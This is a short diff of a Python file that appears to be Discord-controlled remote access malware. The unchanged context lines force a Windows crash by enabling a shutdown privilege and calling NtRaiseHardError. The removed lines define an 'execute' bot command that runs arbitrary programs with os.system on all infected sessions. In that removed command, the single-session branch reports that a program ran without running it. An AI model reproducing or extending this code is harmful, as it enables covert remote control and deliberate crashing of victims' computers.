@@ -449,15 +449,7 @@ while True:
                     ERROR_CODE = 0xDEADDEAD
                     ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                     ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
-
-        @bot.command()
-        async def execute(ctx, session, program):
-            if session == "all":
-                os.system(program)
-                await ctx.send(f"Program '{program}' executed on all sessions.")
-            else:
-                if session == sesja:
-                await ctx.send(f"Program '{program}' executed on session {sesja}.")
+                    
         
         @bot.command()
         async def h(ctx):
